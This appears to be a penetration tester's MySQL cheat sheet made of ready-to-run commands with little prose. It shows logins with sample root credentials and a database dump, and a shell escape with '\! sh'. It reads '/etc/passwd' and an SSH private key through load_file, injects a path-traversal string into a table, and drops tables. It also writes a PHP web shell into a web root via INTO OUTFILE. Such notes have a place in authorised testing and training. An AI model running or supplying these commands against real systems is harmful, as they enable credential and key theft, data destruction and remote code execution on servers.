# MySQL

{% embed url="https://book.hacktricks.xyz/pentesting/pentesting-mysqlhttps://www.phillips321.co.uk/2012/03/06/mysql-cheat-sheet/" %}

### Login

```bash
# Remote
mysql -h 10.0.0.2 -u root -p 
sudo mysql --host=192.168.142.196 --user=root --password=H4u%QJ_H99 Users

# Local
mysql -uroot -pmysql
mysql -h 127.0.0.1 --port 3306 -u root -p
```

### Dump Databases

```bash
# In case mysql login does not work, why not dump teh database
mysqldump -uroot -pmysql wordpress > /tmp/dump.txt
# username:root and password:mysql dbname:wordpress
```

### View Databases

```bash
mysql> show databases;
mysql> use [db name];
mysql> show tables;
mysql> show colums from [table name];
mysql> select * FROM [table name]; 

mysql> select version(); #version
mysql> select @@version(); #version
mysql> select user(); #User
mysql> select database(); #database name

# Get a shell
mysql>\! sh

# Show external file from database
mysql> select load_file('/etc/passwd')
mysql> select load_file('/var/lib/mysql-files/key.txt'); #Read file
mysql> select load_file('/home/hoge/.ssh/id_rsa'); 

# Update the database content in webhooks table
update webhooks set name = '../../../../../' where uuid = 'fda96d32-e8c8-4301-8fb3-c821a316cf77';

# Remove the table 
mysql> drop table [table name];
```

### Write a file

{% code overflow="wrap" %}
```bash
mysql> select "<?php system($_GET['cmd']); ?>" INTO OUTFILE 'C:/xampp/htdocs/dev/shell.php';
```
{% endcode %}

